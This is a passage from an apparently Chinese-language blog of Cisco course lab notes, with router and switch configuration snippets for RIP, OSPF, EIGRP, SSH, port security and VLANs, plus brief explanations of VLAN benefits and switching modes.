Routes</h2><p>RIP配置的时候宣告自己所在的网段即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">R1</span><br><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">router</span> rip<br><span class="hljs-attribute">version</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.1.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.2.0</span><br><span class="hljs-attribute">no</span> auto-summary<br><span class="hljs-attribute">passive</span>-interface s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">default</span>-information originate # 通告配置的默认路由<br><br><span class="hljs-attribute">R2</span><br><span class="hljs-attribute">router</span> rip<br><span class="hljs-attribute">version</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.2.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.3.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.4.0</span><br><span class="hljs-attribute">no</span> auto-summary<br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><br><span class="hljs-attribute">R3</span><br><span class="hljs-attribute">router</span> rip<br><span class="hljs-attribute">version</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.4.0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.5.0</span><br><span class="hljs-attribute">no</span> auto-summary<br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="4-14-amp-5-2-1-4-Configuring-SSH"><a href="#4-14-amp-5-2-1-4-Configuring-SSH" class="headerlink" title="4/14&amp;5.2.1.4  Configuring SSH !!!!"></a>4/14&amp;5.2.1.4  Configuring SSH !!!!</h2><p>==生成树协议学习一下==</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105142666.png" class="" title="image-20200414105142666"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105353212.png" class="" title="image-20200414105353212"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105430248.png" class="" title="image-20200414105430248"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415115335471.png" class="" title="image-20200415115335471"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">copy running-config start<br>service password-encryption<br><br>ip domain-name netacad.pka<br>crypto key generate rsa<br><span class="hljs-number">1024</span><br>username administrator secret cisco<br>line vty <span class="hljs-number">0</span> <span class="hljs-number">15</span><br>transport input ssh<br>login local <br>no password <span class="hljs-comment">#删除密码</span><br><span class="hljs-keyword">exit</span><br>ip ssh version <span class="hljs-number">2</span><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h2 id="5-2-2-7-Configuring-Switch-Port-Security"><a href="#5-2-2-7-Configuring-Switch-Port-Security" class="headerlink" title="5.2.2.7  Configuring Switch Port Security !!!!"></a>5.2.2.7  Configuring Switch Port Security !!!!</h2><p>端口安全违规的默认模式为关闭端口</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-built_in">int</span> f0/<span class="hljs-number">0</span><br>switchport mode access <span class="hljs-comment"># 设为接入</span><br>switchport port-security <span class="hljs-comment"># 启用动态端口安全</span><br>switchport port-security maximum <span class="hljs-number">10</span> <span class="hljs-comment"># 设置端口允许安全地址的最大数量</span><br>switchport port-security mac-address sticky <span class="hljs-comment">#启用粘性获取，保护端口安全，以便动态获取设备的 MAC 地址并将其添加到运行配置</span><br>switchport port-security violation restrict <span class="hljs-comment">#保护接口，使其在出现违规时发出通知，但不禁用端口</span><br><span class="hljs-keyword">interface</span> <span class="hljs-built_in">range</span> fastEthernet0/<span class="hljs-number">3</span> - <span class="hljs-number">24</span> <span class="hljs-comment"># 从3到24端口全部关闭</span><br><br></code></pre></td></tr></table></figure><p>安全违规模式-Protect\Restrict\Shutdown</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415123202415.png" class="" title="image-20200415123202415"><h2 id="5-3-1-2-Skills-Integration-Challenge"><a href="#5-3-1-2-Skills-Integration-Challenge" class="headerlink" title="5.3.1.2 Skills Integration Challenge"></a>5.3.1.2 Skills Integration Challenge</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk">host S1<br>line console <span class="hljs-number">0</span><br>password cisco<br>login <br><span class="hljs-keyword">exit</span><br>enable secrect class<br>service password-encryption<br><br>int vlan1<br>ip add <span class="hljs-number">10.10</span>.<span class="hljs-number">10.2</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>no shut<br><br>ip domain-name cisco.com<br>crypto key generate rsa<br><span class="hljs-number">1024</span><br>username admin secret ccna<br>line vty <span class="hljs-number">0</span> <span class="hljs-number">15</span><br>transport input ssh<br>login local <br><span class="hljs-keyword">exit</span><br>ip ssh version <span class="hljs-number">2</span><br><span class="hljs-keyword">exit</span><br><br>int f0/<span class="hljs-number">1</span><br>switchport mode access <br>switchport port-security <br>switchport port-security maximum <span class="hljs-number">2</span><br>switchport port-security mac-address sticky <span class="hljs-comment">#启用粘性获取，保护端口安全，以便动态获取设备的 MAC 地址并将其添加到运行配置</span><br>switchport port-security violation shutdown <span class="hljs-comment">#保护接口，使其在出现违规时发出通知，禁用端口</span><br>int f0/<span class="hljs-number">2</span><br>switchport mode access <br>switchport port-security <br>switchport port-security maximum <span class="hljs-number">2</span><br>switchport port-security mac-address sticky <br>switchport port-security violation shutdown <br>interface range fastEthernet0/<span class="hljs-number">3</span> - <span class="hljs-number">24</span> <span class="hljs-comment"># 从3到24端口全部关闭</span><br>shutdown<br>interface range g0/<span class="hljs-number">1</span> - <span class="hljs-number">2</span> <span class="hljs-comment"># </span><br>shutdown<br></code></pre></td></tr></table></figure><h2 id="a5-1-2-12-Determining-the-DR-and-BDR"><a href="#a5-1-2-12-Determining-the-DR-and-BDR" class="headerlink" title="a5.1.2.12 Determining the DR and BDR"></a>a5.1.2.12 Determining the DR and BDR</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">show ip ospf <span class="hljs-keyword">interface</span><br><br>#<span class="hljs-symbol">RA</span>:<br><span class="hljs-symbol">int</span> <span class="hljs-symbol">g0</span>/<span class="hljs-symbol">0</span><br><span class="hljs-symbol">ip</span> <span class="hljs-symbol">ospf</span> <span class="hljs-symbol">priority</span> <span class="hljs-symbol">200</span><br><br>#<span class="hljs-symbol">RB</span>:<br><span class="hljs-symbol">int</span> <span class="hljs-symbol">g0</span>/<span class="hljs-symbol">0</span><br><span class="hljs-symbol">ip</span> <span class="hljs-symbol">ospf</span> <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span><br><br>#<span class="hljs-symbol">RC</span>:<br><span class="hljs-symbol">int</span> <span class="hljs-symbol">g0</span>/<span class="hljs-symbol">0</span><br><span class="hljs-symbol">ip</span> <span class="hljs-symbol">ospf</span> <span class="hljs-symbol">priority</span> <span class="hljs-symbol">1</span><br></code></pre></td></tr></table></figure><h2 id="a5-1-3-5-Propagating-a-Default-Route-in-OSPFv2"><a href="#a5-1-3-5-Propagating-a-Default-Route-in-OSPFv2" class="headerlink" title="a5.1.3.5 Propagating a Default Route in OSPFv2"></a>a5.1.3.5 Propagating a Default Route in OSPFv2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">1</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><br><span class="hljs-comment">#R1</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><br><span class="hljs-comment">#R3</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="a5-1-5-7-Configuring-OSPF-Advanced-Features"><a href="#a5-1-5-7-Configuring-OSPF-Advanced-Features" class="headerlink" title="a5.1.5.7 Configuring OSPF Advanced Features"></a>a5.1.5.7 Configuring OSPF Advanced Features</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R1</span><br><span class="hljs-attribute">int</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf hello-interval <span class="hljs-number">15</span> #调整计时器<br><span class="hljs-attribute">ip</span> ospf dead-interval <span class="hljs-number">60</span><br><br><span class="hljs-attribute">bandwidth</span> <span class="hljs-number">64</span> #调整带宽<br><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">area</span> <span class="hljs-number">0</span> authentication message-digest #OSPF身份验证<br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">2</span><br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">3</span><br><br><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">int</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf hello-interval <span class="hljs-number">15</span><br><span class="hljs-attribute">ip</span> ospf dead-interval <span class="hljs-number">60</span><br><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">area</span> <span class="hljs-number">0</span> authentication message-digest<br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">2</span><br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">2</span>-R<span class="hljs-number">3</span><br><br><span class="hljs-comment">#R3</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">area</span> <span class="hljs-number">0</span> authentication message-digest<br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">3</span><br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">2</span>-R<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="a5-2-1-4-Configuring-Static-NAT-no-yet"><a href="#a5-2-1-4-Configuring-Static-NAT-no-yet" class="headerlink" title="a5.2.1.4 Configuring Static NAT no yet"></a>a5.2.1.4 Configuring Static NAT no yet</h2><h2 id="a5-2-2-3-OSPFv2排错"><a href="#a5-2-2-3-OSPFv2排错" class="headerlink" title="a5.2.2.3 OSPFv2排错"></a>a5.2.2.3 OSPFv2排错</h2><h2 id="a6-2-3-6-Configuring-Multiarea-OSPFv2"><a href="#a6-2-3-6-Configuring-Multiarea-OSPFv2" class="headerlink" title="a6.2.3.6 Configuring Multiarea OSPFv2"></a>a6.2.3.6 Configuring Multiarea OSPFv2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R1</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">router</span>-id <span class="hljs-number">1.1.1.1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">10.1.1.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">10.1.2.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.0</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br><br><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">10.2.1.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.0</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br><br><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.1.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.2.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="a7-2-2-4-Configuring-Basic-EIGRP-with-IPv4"><a href="#a7-2-2-4-Configuring-Basic-EIGRP-with-IPv4" class="headerlink" title="a7.2.2.4 Configuring Basic EIGRP with IPv4"></a>a7.2.2.4 Configuring Basic EIGRP with IPv4</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R1：</span><br><span class="hljs-attribute">router</span> eigrp <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.1.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.3.0</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span>-autosummary<br><br><span class="hljs-comment">#R2：</span><br><span class="hljs-attribute">router</span> eigrp <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.2.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.3.0</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.8</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span>-autosummary<br><br><span class="hljs-comment">#R3:</span><br><span class="hljs-attribute">router</span> eigrp <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.1.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.8</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span>-autosummary<br><br></code></pre></td></tr></table></figure><h2 id="4-23"><a href="#4-23" class="headerlink" title="4/23"></a>4/23</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">switchport </span>port-security mac-<span class="hljs-keyword">address </span>&#123;mac_address&#125; <span class="hljs-comment"># 静态配置</span><br></code></pre></td></tr></table></figure><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200423093049790.png" class="" title="image-20200423093049790"><h2 id="4-28"><a href="#4-28" class="headerlink" title="4/28"></a>4/28</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428100318146.png" class="" title="image-20200428100318146"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428100416162.png" class="" title="image-20200428100416162"><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">show</span> vtp <span class="hljs-built_in">status</span><br></code></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">switchport mode <span class="hljs-keyword">dynamic</span><br></code></pre></td></tr></table></figure><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428101820419.png" class="" title="image-20200428101820419"><p>isl：思科专有</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428103111230.png" class="" title="image-20200428103111230"><p>encapsulation dotlQ {num}</p><h2 id="4-30"><a href="#4-30" class="headerlink" title="4/30"></a>4/30</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200430091659535.png" class="" title="image-20200430091659535"><h3 id="存储转发"><a href="#存储转发" class="headerlink" title="存储转发"></a>存储转发</h3><p>完全存下来、校验之后再转发</p><h3 id="直通"><a href="#直通" class="headerlink" title="直通"></a>直通</h3><p>知道目的mac就开始转发</p><h2 id="5-12"><a href="#5-12" class="headerlink" title="5/12"></a>5/12</h2><h3 id="查看当前ios文件设置"><a href="#查看当前ios文件设置" class="headerlink" title="查看当前ios文件设置"></a>查看当前ios文件设置</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> boot<br></code></pre></td></tr></table></figure><p><strong>dir</strong> 命令可用于查看指定目录中的文件列表</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">dir</span> flash<br></code></pre></td></tr></table></figure><h3 id="配置双工和速率"><a href="#配置双工和速率" class="headerlink" title="配置双工和速率"></a>配置双工和速率</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">intferface</span> f<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">duplex</span> full//自动协商双工<br><span class="hljs-attribute">speed</span> <span class="hljs-number">100</span><br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><h3 id="Auto-MDIX"><a href="#Auto-MDIX" class="headerlink" title="Auto-MDIX"></a>Auto-MDIX</h3><blockquote><p>交换机到交换机或交换机到路由器的连接要求使用不同的以太网电缆。在接口上使用自动介质相关接口交叉 (auto-MDIX) 功能可以解决这一问题。当启用 auto-MDIX 时，接口会自动检测所需电缆连接类型（直通或交叉）并配置相应连接。如果连接到无自动 MDIX 功能的交换机，必须使用直通电缆连接到设备（如，服务器、工作站或路由器）。必须使用交叉线缆连接到其他交换机或中继器。</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">int</span> f0/<span class="hljs-number">1</span><br>duplex <span class="hljs-keyword">auto</span><br>speed <span class="hljs-keyword">auto</span><span class="hljs-comment">//自动协商速度</span><br>mdix <span class="hljs-keyword">auto</span> <span class="hljs-comment">//启动mdix</span><br>end<br></code></pre></td></tr></table></figure><h3 id="6-1-1-2-Vlan的优势"><a href="#6-1-1-2-Vlan的优势" class="headerlink" title="6.1.1.2 Vlan的优势"></a>6.1.1.2 Vlan的优势</h3><blockquote><p>VLAN 主要有以下优点：</p><ul><li><strong>安全</strong> － 含有敏感数据的用户组可与网络的其余部分隔离，从而降低泄露机密信息的可能性。如图所示，教师计算机位于 VLAN 10 上，与学生和访客数据流量完全独立。</li></ul><ul><li><strong>成本降低</strong> － 成本高昂的网络升级需求减少，现有带宽和上行链路的利用率更高，因此可节约成本。</li></ul><ul><li><strong>性能提高</strong> － 将第 2 层平面网络划分为多个逻辑工作组（广播域）可以减少网络上不必要的流量并提高性能。</li></ul><ul><li><strong>减小广播域大小</strong> - 将网络划分为多个 VLAN 可减少广播域中的设备数量。如图所示，该网络中有六台计算机，但有三个广播域：Faculty、Student 和 Guest。</li></ul><ul><li><strong>提高 IT 员工效率</strong> － VLAN 为管理网络带来了方便，因为有相似网络需求的用户将共享同一个 VLAN。当您为特定 VLAN 设置新的交换机时，之前为该 VLAN 配置的所有策略和程序均会在分配新端口后应用到端口上。另外，通过为 VLAN 设置一个适当的名称，IT 员工很容易就知道该 VLAN 的功能。在图中，为了便于识别，我们将 VLAN 10 命名为“Faculty”，将 VLAN 20 命名为“Student”，将 VLAN 30 命名为“Guest”。</li></ul><ul><li><strong>简化项目管理和应用管理</strong> - VLAN 将用户和网络设备聚合到一起，以支持商业需求或地域上的需求。通过划分职能，可以让管理项目或使用专业应用更加轻松；此类应用程序的一个例子是教师的电子学习开发平台。</li></ul></blockquote><p>有vlan，广播帧只从已配置，属于同一vlan的端口转发出去。</p><h2 id="5-19"><a href="#5-19" class="headerlink" title="5/19"></a>5/19</h2><h3 id="vlan的类型"><a href="#vlan的类型" class="headerlink" title="vlan的类型"></a>vlan的类型</h3><p>在图中，运行默认配置的交换机上发出 <strong>show vlan brief</strong> 命令。默认情况下，所有端口都分配给 VLAN 1。</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519105755366.png" class="" title="image-20200519105755366"><p>所有端口当前已分配给默认 VLAN 1。没有明确指定本征 VLAN，其他 VLAN 都不处于活动状态；因此网络的本征 VLAN 与管理 VLAN 相同。这将导致安全风险</p><h3 id="6-1-2-1-Vlan中继"><a href="#6-1-2-1-Vlan中继" class="headerlink" title="6.1.2.1 Vlan中继"></a>6.1.2.1 Vlan中继</h3><p>VLAN TRUNK 允许在交换机之间传播所有 VLAN 流量，这样位于同一 VLAN 但连接到不同交换机的设备便可以通信，不需要路由器的干预。VLAN TRUNK 不属于具体的 VLAN，而是作为多个 VLAN 中交换机与路由器之间的管道。</p><h3 id="6-1-2-3-标记以太网帧以便识别VLAN"><a href="#6-1-2-3-标记以太网帧以便识别VLAN" class="headerlink" title="6.1.2.3 标记以太网帧以便识别VLAN"></a>6.1.2.3 标记以太网帧以便识别VLAN</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519110222765.png" class="" title="image-20200519110222765"><h3 id="6-2-1-2-创建vlan"><a href="#6-2-1-2-创建vlan" class="headerlink" title="6.2.1.2 创建vlan"></a>6.2.1.2 创建vlan</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">configure terminal<br>vlan vlan-id<br><span class="hljs-type">name</span> vlan-<span class="hljs-type">name</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">show</span> vlan brief<br><span class="hljs-keyword">show</span> vlan<br></code></pre></td></tr></table></figure><h2 id="5-21"><a href="#5-21" class="headerlink" title="5/21"></a>5/21</h2><h3 id="6-2-1-3-端口分配到vlan"><a href="#6-2-1-3-端口分配到vlan" 